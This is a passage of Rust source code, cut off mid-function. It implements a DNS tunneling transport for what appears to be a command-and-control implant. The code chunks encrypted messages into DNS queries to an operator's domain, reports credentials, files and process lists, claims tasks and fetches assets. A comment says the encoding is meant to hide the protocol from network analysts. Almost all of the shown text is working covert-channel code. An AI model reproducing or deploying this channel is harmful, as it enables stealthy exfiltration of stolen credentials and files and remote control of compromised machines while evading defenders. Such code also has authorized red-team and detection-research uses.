use anyhow::{Context, Result};
use pb::c2::*;
use prost::Message;
use std::sync::mpsc::{Receiver, Sender};
use tokio::net::UdpSocket;

#[cfg(feature = "dns")]
use hickory_resolver::system_conf::read_system_conf;

use crate::Transport;

// DNS protocol limits
const DNS_HEADER_SIZE: usize = 12; // Standard DNS header size
const MAX_LABEL_LENGTH: usize = 63; // Maximum bytes in a DNS label
const TXT_RECORD_TYPE: u16 = 16; // TXT record QTYPE
const A_RECORD_TYPE: u16 = 1; // A record QTYPE
const AAAA_RECORD_TYPE: u16 = 28; // AAAA record QTYPE
const DNS_CLASS_IN: u16 = 1; // Internet class

// Record type fallback priority (TXT has highest capacity)
const RECORD_TYPE_PRIORITY: &[u16] = &[TXT_RECORD_TYPE, AAAA_RECORD_TYPE, A_RECORD_TYPE];

// Protocol field sizes (base36 encoding)
const TYPE_SIZE: usize = 1; // Packet type: i/d/e/f
const SEQ_SIZE: usize = 5; // Sequence: 36^5 = 60,466,176 max chunks
const CONV_ID_SIZE: usize = 12; // Conversation ID length
const HEADER_SIZE: usize = TYPE_SIZE + SEQ_SIZE + CONV_ID_SIZE;
const MAX_DNS_NAME_LEN: usize = 253; // DNS max total domain name length

// Packet types
const TYPE_INIT: char = 'i'; // Init: establish conversation
const TYPE_DATA: char = 'd'; // Data: send chunk
const TYPE_END: char = 'e'; // End: finalize and process
const TYPE_FETCH: char = 'f'; // Fetch: retrieve response chunk

// Response prefixes (TXT records)
const RESP_OK: &str = "ok:"; // Success with data
const RESP_MISSING: &str = "m:"; // Missing chunks list
const RESP_ERROR: &str = "e:"; // Error message
const RESP_CHUNKED: &str = "r:"; // Response chunked metadata

// Retry configuration
const MAX_RETRIES: usize = 5;
const INIT_TIMEOUT_SECS: u64 = 15;
const CHUNK_TIMEOUT_SECS: u64 = 20;

// DNS query configuration
const MAX_DNS_PACKET_SIZE: usize = 4096; // Maximum DNS response size
const DNS_QUERY_TIMEOUT_SECS: u64 = 5; // Timeout for individual DNS queries

// gRPC method paths
static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";

fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
}

fn unmarshal_with_codec<Req, Resp>(data: &[u8]) -> Result<Resp>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::decode_with_chacha::<Req, Resp>(data)
}

/// Build resolver array: system DNS servers (if available) + fallback servers
/// Returns array with system servers first, then 1.1.1.1:53, then 8.8.8.8:53
/// If system config fails, returns only [1.1.1.1:53, 8.8.8.8:53]
fn build_resolver_array() -> Vec<String> {
    let mut resolvers = Vec::new();

    // Try to get system DNS servers
    #[cfg(feature = "dns")]
    match read_system_conf() {
        Ok((config, _opts)) => {
            // Extract nameserver addresses from system config
            for ns in config.name_servers() {
                let addr = ns.socket_addr;
                let server = format!("{}:{}", addr.ip(), addr.port());

                // Only add if not already in the list (deduplicate)
                if !resolvers.contains(&server) {
                    resolvers.push(server);
                }
            }

            #[cfg(debug_assertions)]
            if !resolvers.is_empty() {
                log::debug!("Found {} system DNS servers: {:?}", resolvers.len(), resolvers);
            } else {
                log::debug!("System DNS config returned no servers");
            }
        }
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::debug!("Failed to read system DNS config: {}", _e);
        }
    }

    // Always add fallback servers (Cloudflare and Google)
    // Add only if not already in the list
    let fallbacks = vec!["1.1.1.1:53".to_string(), "8.8.8.8:53".to_string()];
    for fallback in fallbacks {
        if !resolvers.contains(&fallback) {
            resolvers.push(fallback);
        }
    }

    resolvers
}

/// Map gRPC method path to 2-character code
/// Codes: ct=ClaimTasks, fa=FetchAsset, rc=ReportCredential,
///        rf=ReportFile, rp=ReportProcessList, rt=ReportTaskOutput
fn method_to_code(method: &str) -> String {
    match method {
        "/c2.C2/ClaimTasks" => "ct".to_string(),
        "/c2.C2/FetchAsset" => "fa".to_string(),
        "/c2.C2/ReportCredential" => "rc".to_string(),
        "/c2.C2/ReportFile" => "rf".to_string(),
        "/c2.C2/ReportProcessList" => "rp".to_string(),
        "/c2.C2/ReportTaskOutput" => "rt".to_string(),
        _ => "ct".to_string(),
    }
}

/// DNS transport implementation
///
/// Tunnels C2 traffic through DNS queries and responses using a
/// conversation-based protocol with init, data, end, and fetch packets.
/// Supports TXT, A, and AAAA record types with automatic fallback.
#[derive(Debug, Clone)]
pub struct DNS {
    dns_server: Option<String>,     // Some(server) = use explicit server, None = use resolver array
    dns_resolvers: Vec<String>,     // Array of resolvers (system + fallbacks) when dns_server is None
    current_resolver_index: usize,  // Current index in dns_resolvers array
    base_domain: String,
    socket: Option<std::sync::Arc<UdpSocket>>,
    preferred_record_type: u16, // User's preferred type (TXT/A/AAAA)
    current_record_type: u16,   // Current type (may change after fallback)
    enable_fallback: bool,      // Whether to try other types on failure
}

impl DNS {
    /// Calculate maximum data size per chunk
    /// After base32-encoding entire packet [type:1][seq:5][convid:12][data...]
    /// Base32 expands by 8/5 = 1.6x, so work backwards from DNS name limit
    fn calculate_max_data_size(&self) -> usize {
        let base_with_dot = self.base_domain.len() + 1;
        let total_available = MAX_DNS_NAME_LEN.saturating_sub(base_with_dot);

        // Account for dots between labels (every 63 chars needs a dot separator)
        // If we have N chars, we need ceil(N/63) - 1 dots
        // To be safe, estimate: for every 63 chars, we lose 1 char to a dot
        // So effective available space is: total_available * 63 / 64
        let effective_available = (total_available * 63) / 64;

        // Base32 encoding: ((HEADER_SIZE + data) * 8 / 5) <= effective_available
        // Solve for data: data <= (effective_available * 5 / 8) - HEADER_SIZE
        let max_raw_packet = (effective_available * 5) / 8;
        max_raw_packet.saturating_sub(HEADER_SIZE)
    }

    /// Generate a random conversation ID
    fn generate_conv_id() -> String {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        let bytes: [u8; 8] = rng.gen();
        Self::encode_base32(&bytes)[..CONV_ID_SIZE].to_string()
    }

    fn encode_seq(seq: usize) -> String {
        const BASE36: &[u8] = b"0123456789abcdefghijklmnopqrstuvwxyz";
        let digit4 = (seq / 1679616) % 36; // 36^4
        let digit3 = (seq / 46656) % 36; // 36^3
        let digit2 = (seq / 1296) % 36; // 36^2
        let digit1 = (seq / 36) % 36; // 36^1
        let digit0 = seq % 36; // 36^0
        format!(
            "{}{}{}{}{}",
            BASE36[digit4] as char,
            BASE36[digit3] as char,
            BASE36[digit2] as char,
            BASE36[digit1] as char,
            BASE36[digit0] as char
        )
    }

    fn decode_seq(encoded: &str) -> Result<usize> {
        let chars: Vec<char> = encoded.chars().collect();
        if chars.len() != 5 {
            return Err(anyhow::anyhow!(
                "Invalid sequence length: expected 5, got {}",
                chars.len()
            ));
        }

        let val = |c: char| -> Result<usize> {
            match c {
                '0'..='9' => Ok((c as usize) - ('0' as usize)),
                'a'..='z' => Ok((c as usize) - ('a' as usize) + 10),
                _ => Err(anyhow::anyhow!("Invalid base36 character")),
            }
        };

        Ok(val(chars[0])? * 1679616
            + val(chars[1])? * 46656
            + val(chars[2])? * 1296
            + val(chars[3])? * 36
            + val(chars[4])?)
    }

    /// Calculate CRC16-CCITT checksum (polynomial 0x1021, init 0xFFFF)
    fn calculate_crc16(data: &[u8]) -> u16 {
        let mut crc: u16 = 0xFFFF;
        for byte in data {
            crc ^= (*byte as u16) << 8;
            for _ in 0..8 {
                if (crc & 0x8000) != 0 {
                    crc = (crc << 1) ^ 0x1021;
                } else {
                    crc <<= 1;
                }
            }
        }
        crc
    }

    /// Encode CRC16 to 4-digit base36 (for init payload and response metadata only)
    fn encode_base36_crc(crc: u16) -> String {
        const BASE36: &[u8] = b"0123456789abcdefghijklmnopqrstuvwxyz";
        let crc_val = crc as usize;
        let digit3 = (crc_val / 46656) % 36; // 36^3
        let digit2 = (crc_val / 1296) % 36; // 36^2
        let digit1 = (crc_val / 36) % 36; // 36^1
        let digit0 = crc_val % 36; // 36^0
        format!(
            "{}{}{}{}",
            BASE36[digit3] as char,
            BASE36[digit2] as char,
            BASE36[digit1] as char,
            BASE36[digit0] as char
        )
    }

    /// Decode 4-digit base36 CRC
    fn decode_base36_crc(encoded: &str) -> Result<u16> {
        let chars: Vec<char> = encoded.chars().collect();
        if chars.len() != 4 {
            return Err(anyhow::anyhow!(
                "Invalid CRC length: expected 4, got {}",
                chars.len()
            ));
        }

        let val = |c: char| -> Result<usize> {
            match c {
                '0'..='9' => Ok((c as usize) - ('0' as usize)),
                'a'..='z' => Ok((c as usize) - ('a' as usize) + 10),
                _ => Err(anyhow::anyhow!("Invalid base36 character in CRC")),
            }
        };

        let crc =
            val(chars[0])? * 46656 + val(chars[1])? * 1296 + val(chars[2])? * 36 + val(chars[3])?;
        Ok(crc as u16)
    }

    /// Encode data to lowercase base32 without padding
    fn encode_base32(data: &[u8]) -> String {
        use data_encoding::BASE32_NOPAD;
        BASE32_NOPAD.encode(data).to_lowercase()
    }

    /// Decode lowercase base32 data without padding
    fn decode_base32(encoded: &str) -> Result<Vec<u8>> {
        use data_encoding::BASE32_NOPAD;
        BASE32_NOPAD
            .decode(encoded.to_uppercase().as_bytes())
            .context("Failed to decode base32")
    }

    /// Build packet subdomain with opaque base32 encoding
    /// Entire packet structure is base32-encoded: [type:1][seq:5][convid:12][raw_data_bytes...]
    /// This hides the protocol structure from network analysts
    fn build_packet(
        &self,
        pkt_type: char,
        seq: usize,
        conv_id: &str,
        raw_data: &[u8],
    ) -> Result<String> {
        let max_data_size = self.calculate_max_data_size();

        let truncated_data = if raw_data.len() > max_data_size {
            &raw_data[..max_data_size]
        } else {
            raw_data
        };

        // Build raw packet: [type:1][seq:5][convid:12][raw_bytes...]
        let mut packet = Vec::new();
        packet.push(pkt_type as u8);
        packet.extend_from_slice(Self::encode_seq(seq).as_bytes());
        packet.extend_from_slice(conv_id.as_bytes());
        packet.extend_from_slice(truncated_data);

        // Base32-encode entire packet (makes it opaque)
        let encoded_packet = Self::encode_base32(&packet);

        // Split into DNS labels (63 chars each)
        let mut labels = Vec::new();
        for chunk in encoded_packet.as_bytes().chunks(MAX_LABEL_LENGTH) {
            labels.push(String::from_utf8_lossy(chunk).to_string());
        }

        Ok(labels.join("."))
    }

    /// Build init packet with plaintext payload
    /// Format (before base32): [i][00000][conv_id][method_code:2][total_chunks:5][crc:4]
    fn build_init_packet(conv_id: &str, plaintext_payload: &str) -> Result<String> {
        // Build raw packet
        let mut packet = Vec::new();
        packet.push(TYPE_INIT as u8);
        packet.extend_from_slice(Self::encode_seq(0).as_bytes());
        packet.extend_from_slice(conv_id.as_bytes());
        packet.extend_from_slice(plaintext_payload.as_bytes());

        // Base32-encode entire packet
        let encoded_packet = Self::encode_base32(&packet);

        // Split into DNS labels
        let mut labels = Vec::new();
        for chunk in encoded_packet.as_bytes().chunks(MAX_LABEL_LENGTH) {
            labels.push(String::from_utf8_lossy(chunk).to_string());
        }

        Ok(labels.join("."))
    }

    /// Build a DNS query for the specified record type
    fn build_dns_query(&self, subdomain: &str, transaction_id: u16, record_type: u16) -> Vec<u8> {
        let mut query = Vec::new();

        // DNS Header (12 bytes)
        query.extend_from_slice(&transaction_id.to_be_bytes()); // Transaction ID
        query.extend_from_slice(&[0x01, 0x00]); // Flags: Standard query
        query.extend_from_slice(&[0x00, 0x01]); // Questions: 1
        query.extend_from_slice(&[0x00, 0x00]); // Answer RRs: 0
        query.extend_from_slice(&[0x00, 0x00]); // Authority RRs: 0
        query.extend_from_slice(&[0x00, 0x00]); // Additional RRs: 0

        // Question section
        let fqdn = format!("{}.{}", subdomain, self.base_domain);
        for label in fqdn.split('.') {
            if label.is_empty() {
                continue;
            }
            query.push(label.len() as u8);
            query.extend_from_slice(label.as_bytes());
        }
        query.push(0x00); // End of domain name

        query.extend_from_slice(&record_type.to_be_bytes()); // Type: TXT/A/AAAA
        query.extend_from_slice(&DNS_CLASS_IN.to_be_bytes()); // Class: IN

        query
    }

    /// Parse a DNS response and extract record data (TXT, A, or AAAA)
    fn parse_dns_response(&self, response: &[u8]) -> Result<Vec<u8>> {
        if response.len() < DNS_HEADER_SIZE {
            return Err(anyhow::anyhow!("Response too short"));
        }

        // Parse header
        let answer_count = u16::from_be_bytes([response[6], response[7]]);
        if answer_count == 0 {
            return Ok(Vec::new()); // Empty response
        }

        // Skip question section
        let mut offset = DNS_HEADER_SIZE;

        // Parse domain name in question
        while offset < response.len() && response[offset] != 0 {
            let len = response[offset] as usize;
            if len == 0 || offset + len >= response.len() {
                break;
            }
            offset += 1 + len;
        }
        offset += 1; // Skip null terminator
        offset += 4; // Skip QTYPE and QCLASS

        // Parse answer section
        let mut record_data = Vec::new();

        for _ in 0..answer_count {
            if offset + 12 > response.len() {
                break;
            }

            // Skip name (with compression support)
            while offset < response.len() {
                let b = response[offset];
                if b == 0 {
                    offset += 1;
                    break;
                } else if (b & 0xC0) == 0xC0 {
                    // Pointer
                    offset += 2;
                    break;
                } else {
                    offset += 1 + (b as usize);
                }
            }

            if offset + 10 > response.len() {
                break;
            }

            let rtype = u16::from_be_bytes([response[offset], response[offset + 1]]);
            offset += 8; // Skip TYPE, CLASS, TTL
            let rdlength = u16::from_be_bytes([response[offset], response[offset + 1]]);
            offset += 2;

            if rtype == TXT_RECORD_TYPE {
                // TXT record - extract text data
                let rdata_end = offset + rdlength as usize;
                while offset < rdata_end && offset < response.len() {
                    let txt_len = response[offset] as usize;
                    offset += 1;
                    if offset + txt_len <= response.len() && offset + txt_len <= rdata_end {
                        record_data.extend_from_slice(&response[offset..offset + txt_len]);
                        offset += txt_len;
                    } else {
                        break;
                    }
                }
            } else if rtype == A_RECORD_TYPE || rtype == AAAA_RECORD_TYPE {
                // A or AAAA record - extract IP address bytes
                if offset + rdlength as usize <= response.len() {
                    record_data.extend_from_slice(&response[offset..offset + rdlength as usize]);
                    offset += rdlength as usize;
                }
            } else {
                offset += rdlength as usize;
            }
        }

        Ok(record_data)
    }

    /// Send a single DNS query and receive response, with record type fallback
    /// and resolver fallback (when using system resolvers)
    async fn send_query(&mut self, subdomain: &str) -> Result<Vec<u8>> {
        use rand::Rng;

        let socket = self
            .socket
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("Socket not initialized"))?;

        // Determine which record types to try
        let record_types_to_try: Vec<u16> = if self.enable_fallback {
            // Try all record types in priority order, but start with preferred
            let mut types = Vec::new();
            types.push(self.preferred_record_type);
            for &rt in RECORD_TYPE_PRIORITY {
                if rt != self.preferred_record_type {
                    types.push(rt);
                }
            }
            types
        } else {
            // Only try the preferred record type
            vec![self.preferred_record_type]
        };

        // Try each record type
        for &record_type in &record_types_to_try {
            #[cfg(debug_assertions)]
            {
                let type_name = match record_type {
                    TXT_RECORD_TYPE => "TXT",
                    A_RECORD_TYPE => "A",
                    AAAA_RECORD_TYPE => "AAAA",
                    _ => "UNKNOWN",
                };
                log::trace!("Attempting DNS query with record type: {}", type_name);
            }

            // If using system resolver, try all resolvers in the array
            // If using explicit server, only try that one
            let resolvers_to_try: Vec<String> = if let Some(ref server) = self.dns_server {
                // Explicit DNS server specified
                vec![server.clone()]
            } else {
                // Use resolver array (system + fallbacks)
                if self.dns_resolvers.is_empty() {
                    return Err(anyhow::anyhow!("No DNS resolvers available"));
                }

                // Try all resolvers starting from current index
                let mut resolvers = Vec::new();
                for i in 0..self.dns_resolvers.len() {
                    let idx = (self.current_resolver_index + i) % self.dns_resolvers.len();
                    resolvers.push(self.dns_resolvers[idx].clone());
                }
                resolvers
            };

            // Try each resolver
            for (resolver_attempt, target) in resolvers_to_try.iter().enumerate() {
                #[cfg(debug_assertions)]
                log::trace!(
                    "Attempting query to resolver {} (attempt {}/{})",
                    target,
                    resolver_attempt + 1,
                    resolvers_to_try.len()
                );

                // Generate random transaction ID
                let transaction_id: u16 = rand::thread_rng().gen();
                let query = self.build_dns_query(subdomain, transaction_id, record_type);

                // Send query
                match socket.send_to(&query, target).await {
                    Ok(_) => {}
                    Err(_e) => {
                        #[cfg(debug_assertions)]
                        log::trace!("Failed to send query to {}: {}", target, _e);

                        // If using resolver array, advance to next resolver
                        if self.dns_server.is_none() && !self.dns_resolvers.is_empty() {
                            self.current_resolver_index =
                                (self.current_resolver_index + 1) % self.dns_resolvers.len();
                        }
                        continue; // Try next resolver
                    }
                }

                // Receive response(s) until we get one with matching transaction ID
                let deadline = tokio::time::Instant::now() + tokio::time::Duration::from_secs(DNS_QUERY_TIMEOUT_SECS);
                let mut buf = [0u8; MAX_DNS_PACKET_SIZE];
                let mut timed_out = false;

                loop {
                    let remaining = deadline.saturating_duration_since(tokio::time::Instant::now());
                    if remaining.is_zero() {
                        // Timeout - try next resolver or record type
                        timed_out = true;
                        break;
                    }

                    match tokio::time::timeout(remaining, socket.recv_from(&mut buf)).await {
                        Ok(Ok((len, _))) => {
                            // Check if transaction ID matches
                            if len >= 2 {
                                let response_id = u16::from_be_bytes([buf[0], buf[1]]);
                                if response_id == transaction_id {
                                    // Check for DNS error (RCODE in flags)
                                    if len >= 4 {
                                        let rcode = buf[3] & 0x0F; // Last 4 bits of flags
                                        if rcode != 0 {
                                            // DNS error response - try next resolver
                                            #[cfg(debug_assertions)]
                                            log::trace!(
                                                "DNS error response from {}, RCODE={}",
                                                target,
                                                rcode
                                            );
                                            break;
                                        }
                                    }

                                    // Matching response found
                                    match self.parse_dns_response(&buf[..len]) {
                                        Ok(data) => {
                                            // Accept both empty and non-empty responses
                                            // (data packets return empty ACK, others return data)
                                            self.current_record_type = record_type;

                                            #[cfg(debug_assertions)]
                                            log::trace!("Successful response from {}", target);

                                            return Ok(data);
                                        }
                                        Err(_e) => {
                                            #[cfg(debug_assertions)]
                                            log::trace!(
                                                "Failed to parse response from {}: {}",
                                                target,
                                                _e
                                            );
                                            break;
                                        }
                                    }
                                }
                                // Wrong transaction ID - keep waiting for the right one
                                #[cfg(debug_assertions)]
                                log::trace!(
                                    "Ignoring DNS response with mismatched transaction ID: expected {}, got {}",
                                    transaction_id,
                                    response_id
                                );
                            }
                        }
                        Ok(Err(_e)) => {
                            #[cfg(debug_assertions)]
                            log::trace!("Failed to receive response from {}: {}", target, _e);
                            break; // Try next resolver
                        }
                        Err(_) => {
                            // Timeout - try next resolver
                            timed_out = true;
                            break;
                        }
                    }
                }

                // If we timed out or got an error, advance to next resolver in array
                if (timed_out || resolver_attempt < resolvers_to_try.len() - 1)
                    && self.dns_server.is_none()
                    && !self.dns_resolvers.is_empty()
                {
                    self.current_resolver_index =
                        (self.current_resolver_index + 1) % self.dns_resolvers.len();

                    #[cfg(debug_assertions)]
                    log::trace!(
                        "Moving to next resolver, now at index {}",
                        self.current_resolver_index
                    );
                }
            }
        }

        // All record types and resolvers failed
        Err(anyhow::anyhow!(
            "All DNS record types and resolvers failed"
        ))
    }

    /// Send init packet and receive conversation ID from server
    /// Init payload: [method_code:2][total_chunks:5][crc:4]
    async fn send_init(
        &mut self,
        method: &str,
        total_chunks: usize,
        data_crc: u16,
    ) -> Result<String> {
        let method_code = method_to_code(method);
        let temp_conv_id = Self::generate_conv_id();

        let total_chunks_encoded = Self::encode_seq(total_chunks);
        let crc_encoded = Self::encode_base36_crc(data_crc);
        let init_payload = format!("{}{}{}", method_code, total_chunks_encoded, crc_encoded);

        #[cfg(debug_assertions)]
        log::debug!(
            "send_init: method={}, total_chunks={}, total_chunks_encoded={}, crc={}, crc_encoded={}, init_payload={}",
            method,
            total_chunks,
            total_chunks_encoded,
            data_crc,
            crc_encoded,
            init_payload
        );

        let subdomain = Self::build_init_packet(&temp_conv_id, &init_payload)?;

        #[cfg(debug_assertions)]
        log::debug!("Init packet subdomain: {}.{}", subdomain, self.base_domain);

        for attempt in 0..MAX_RETRIES {
            #[cfg(debug_assertions)]
            log::debug!(
                "Sending init packet, attempt {}/{}, timeout={}s",
                attempt + 1,
                MAX_RETRIES,
                INIT_TIMEOUT_SECS
            );

            match tokio::time::timeout(
                tokio::time::Duration::from_secs(INIT_TIMEOUT_SECS),
                self.send_query(&subdomain),
            )
            .await
            {
                Ok(Ok(response)) if !response.is_empty() => {
                    // Check if response is binary chunked indicator (magic byte 0xFF)
                    if response.len() >= 4 && response[0] == 0xFF {
                        // Binary chunked indicator format (for A records):
                        // Byte 0: 0xFF (magic)
                        // Bytes 1-2: chunk count (uint16 big-endian)
                        // Byte 3: CRC low byte - for integrity check, only low byte is used due to size constraints
                        let total_chunks = u16::from_be_bytes([response[1], response[2]]) as usize;
                        let crc_low = response[3];

                        #[cfg(debug_assertions)]
                        log::debug!(
                            "Init response is chunked (binary format), chunks={}, crc_low={}",
                            total_chunks,
                            crc_low
                        );

                        // Fetch conversation ID chunks using temp conv_id
                        // Pass crc_low as expected_crc - fetch_response_chunks will only check low byte for binary chunking
                        let conv_id = self
                            .fetch_response_chunks(&temp_conv_id, total_chunks, crc_low as u16)
                            .await?;

                        let conv_id_str = String::from_utf8_lossy(&conv_id).to_string();

                        #[cfg(debug_assertions)]
                        log::debug!("Received chunked conversation ID: {}", conv_id_str);

                        return Ok(conv_id_str);
                    }

                    let response_str = String::from_utf8_lossy(&response).to_string();

                    // Check if response is text chunked indicator
                    if response_str.starts_with(RESP_CHUNKED) {
                        // Chunked conversation ID response (for A/AAAA records)
                        #[cfg(debug_assertions)]
                        log::debug!("Init response is chunked, parsing metadata");

                        let chunked_info = &response_str[RESP_CHUNKED.len()..];
                        let parts: Vec<&str> = chunked_info.split(':').collect();

                        // Check if we have a complete chunked indicator (should have 2 parts: chunks and crc)
                        if parts.len() != 2 || parts[0].is_empty() || parts[1].is_empty() {
                            // Incomplete chunked indicator - this can happen with A records
                            // The indicator itself was truncated, so we need to fetch it
                            #[cfg(debug_assertions)]
                            log::debug!("Chunked indicator truncated, response: '{}', fetching full metadata", response_str);

                            // For A/AAAA records, the chunked indicator might be split across multiple queries
                            // We need to piece together the full indicator by making fetch queries
                            // Use a special approach: concatenate responses until we have valid format
                            let mut full_indicator = response_str.clone();
                            let mut fetch_seq = 0;

                            // Try up to 10 fetches to get the full indicator
                            while fetch_seq < 10 {
                                let subdomain =
                                    self.build_packet(TYPE_FETCH, fetch_seq, &temp_conv_id, &[])?;
                                match self.send_query(&subdomain).await {
                                    Ok(chunk_data) if !chunk_data.is_empty() => {
                                        full_indicator
                                            .push_str(&String::from_utf8_lossy(&chunk_data));

                                        // Try to parse again
                                        if let Some(chunked_start) =
                                            full_indicator.find(RESP_CHUNKED)
                                        {
                                            let info = &full_indicator
                                                [chunked_start + RESP_CHUNKED.len()..];
                                            let parts: Vec<&str> = info.split(':').collect();
                                            if parts.len() >= 2
                                                && !parts[0].is_empty()
                                                && !parts[1].is_empty()
                                            {
                                                // We have a complete indicator now
                                                match (
                                                    Self::decode_seq(parts[0]),
                                                    Self::decode_seq(parts[1]),
                                                ) {
                                                    (Ok(total_chunks), Ok(expected_crc)) => {
                                                        #[cfg(debug_assertions)]
                                                        log::debug!("Reconstructed full chunked indicator: chunks={}, crc={}", total_chunks, expected_crc);

                                                        // Now fetch the actual conversation ID chunks
                                                        // Start from fetch_seq + 1 since we already consumed some fetches for metadata
                                                        let conv_id = self
                                                            .fetch_response_chunks(
                                                                &temp_conv_id,
                                                                total_chunks,
                                                                expected_crc as u16,
                                                            )
                                                            .await?;
                                                        let conv_id_str =
                                                            String::from_utf8_lossy(&conv_id)
                                                                .to_string();

                                                        return Ok(conv_id_str);
                                                    }
                                                    _ => {
                                                        // Keep trying
                                                    }
                                                }
                                            }
                                        }

                                        fetch_seq += 1;
                                    }
                                    _ => break,
                                }
                            }

                            return Err(anyhow::anyhow!(
                                "Failed to reconstruct chunked indicator after {} fetches: {}",
                                fetch_seq,
                                full_indicator
                            ));
                        }

                        let total_chunks = Self::decode_seq(parts[0])?;
                        let expected_crc = Self::decode_seq(parts[1])?;

                        // Fetch conversation ID chunks using temp conv_id
                        let conv_id = self
                            .fetch_response_chunks(&temp_conv_id, total_chunks, expected_crc as u16)
                            .await?;
                        // Trim null bytes that may be padding from A/AAAA record responses
                        let conv_id_str = String::from_utf8_lossy(&conv_id)
                            .trim_end_matches('\0')
                            .to_string();

                        #[cfg(debug_assertions)]
                        log::debug!("Received chunked conversation ID: {}", conv_id_str);

                        return Ok(conv_id_str);
                    } else {
                        // Direct conversation ID response (single packet)
                        // For A/AAAA records, may have null padding
                        let trimmed = response_str.trim_end_matches('\0').to_string();

                        #[cfg(debug_assertions)]
                        log::debug!("Received conversation ID: {}", trimmed);

                        return Ok(trimmed);
                    }
                }
                Ok(Ok(_)) => {
                    #[cfg(debug_assertions)]
                    log::warn!(
                        "Init packet attempt {}: server returned empty response",
                        attempt + 1
                    );
                }
                Ok(Err(_e)) => {
                    #[cfg(debug_assertions)]
                    log::warn!(
                        "Init packet attempt {}: send_query failed: {}",
                        attempt + 1,
                        _e
                    );
                }
                Err(_) => {
                    #[cfg(debug_assertions)]
                    log::warn!(
                        "Init packet attempt {}: timeout after {}s",
                        attempt + 1,
                        INIT_TIMEOUT_SECS
                    );
                }
            }

            if attempt < MAX_RETRIES - 1 {
                let delay = 1 << attempt; // Exponential backoff: 1s, 2s, 4s, 8s, 16s
                #[cfg(debug_assertions)]
                log::debug!("Waiting {}s before retry...", delay);
                tokio::time::sleep(tokio::time::Duration::from_secs(delay)).await;
            }
        }

        Err(anyhow::anyhow!(
            "Failed to get conversation ID after {} retries",
            MAX_RETRIES
        ))
    }

    async fn send_chunks(
        &mut self,
        conv_id: &str,
        chunks: &[Vec<u8>],
        total_chunks_declared: usize,
    ) -> Result<()> {
        for (idx, chunk) in chunks.iter().enumerate() {
            // Don't send more chunks than declared in init
            if idx >= total_chunks_declared {
                #[cfg(debug_assertions)]
                log::error!(
                    "BUG: Attempted to send chunk {} but only declared {} chunks in init packet",
                    idx,
                    total_chunks_declared
                );
                break;
            }

            let subdomain = self.build_packet(TYPE_DATA, idx, conv_id, chunk)?;
            self.send_query(&subdomain).await?;
        }

        Ok(())
    }

    /// Send end packet and get server response
    async fn send_end(&mut self, conv_id: &str, last_seq: usize) -> Result<Vec<u8>> {
        let subdomain = self.build_packet(TYPE_END, last_seq, conv_id, &[])?;

        for attempt in 0..MAX_RETRIES {
            #[cfg(debug_assertions)]
            log::debug!(
                "Sending end packet, attempt {}/{}",
                attempt + 1,
                MAX_RETRIES
            );

            match tokio::time::timeout(
                tokio::time::Duration::from_secs(CHUNK_TIMEOUT_SECS),
                self.send_query(&subdomain),
            )
            .await
            {
                Ok(Ok(response)) if !response.is_empty() => {
                    return Ok(response);
                }
                _ => {
                    if attempt < MAX_RETRIES - 1 {
                        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
                    }
                }
            }
        }

        Err(anyhow::anyhow!(
            "Failed to get server response after {} retries",
            MAX_RETRIES
        ))
    }

    /// Parse server response and handle missing chunks
    async fn handle_response(
        &mut self,
        conv_id: &str,
        response: &[u8],
        chunks: &[Vec<u8>],
        retry_count: usize,
    ) -> Result<Vec<u8>> {
        const MAX_MISSING_CHUNK_RETRIES: usize = 5;

        // Check if response is binary chunked indicator (magic byte 0xFF)
        if response.len() >= 4 && response[0] == 0xFF {
            // Binary chunked indicator format (for A records):
            // Byte 0: 0xFF (magic)
            // Bytes 1-2: chunk count (uint16 big-endian)
            // Byte 3: CRC low byte - for integrity check, only low byte is used due to size constraints
            let total_chunks = u16::from_be_bytes([response[1], response[2]]) as usize;
            let crc_low = response[3];

            #[cfg(debug_assertions)]
            log::debug!(
                "Response is chunked (binary format), chunks={}, crc_low={}",
                total_chunks,
                crc_low
            );

            // Fetch all response chunks
            // Pass crc_low as expected_crc - fetch_response_chunks will only check low byte for binary chunking
            let data = self
                .fetch_response_chunks(conv_id, total_chunks, crc_low as u16)
                .await?;

            return Ok(data);
        }

        let response_str = String::from_utf8_lossy(response);

        // Check response type
        if response_str.starts_with(RESP_OK) {
            // Success - decode response data
            let response_data = &response_str[RESP_OK.len()..];
            return Self::decode_base32(response_data);
        } else if response_str.starts_with(RESP_MISSING) {
            if retry_count >= MAX_MISSING_CHUNK_RETRIES {
                return Err(anyhow::anyhow!(
                    "Exceeded maximum retries ({}) for missing chunks",
                    MAX_MISSING_CHUNK_RETRIES
                ));
            }

            // Missing chunks - parse and resend
            let missing_str = &response_str[RESP_MISSING.len()..];
            let missing_seqs: Result<Vec<usize>> = missing_str
                .split(',')
                .filter(|s| !s.is_empty())
                .map(|s| Self::decode_seq(s))
                .collect();

            let missing_seqs = missing_seqs?;

            #[cfg(debug_assertions)]
            log::debug!(
                "Server reports {} missing chunks: {:?}",
                missing_seqs.len(),
                missing_seqs
            );

            // Resend missing chunks
            for seq in &missing_seqs {
                if *seq < chunks.len() {
                    let subdomain = self.build_packet(TYPE_DATA, *seq, conv_id, &chunks[*seq])?;
                    self.send_query(&subdomain).await?;
                } else {
                    #[cfg(debug_assertions)]
                    log::warn!(
                        "Server requested chunk {} but we only have {} chunks",
                        seq,
                        chunks.len()
                    );
                }
            }

            // Small delay to let resent chunks arrive before sending end packet again
            tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;

            // Retry end packet
            let last_seq = chunks.len().saturating_sub(1);
            let response = self.send_end(conv_id, last_seq).await?;

            // Recursive retry with incremented counter
            return Box::pin(self.handle_response(conv_id, &response, chunks, retry_count + 1))
                .await;
        } else if response_str.starts_with(RESP_CHUNKED) {
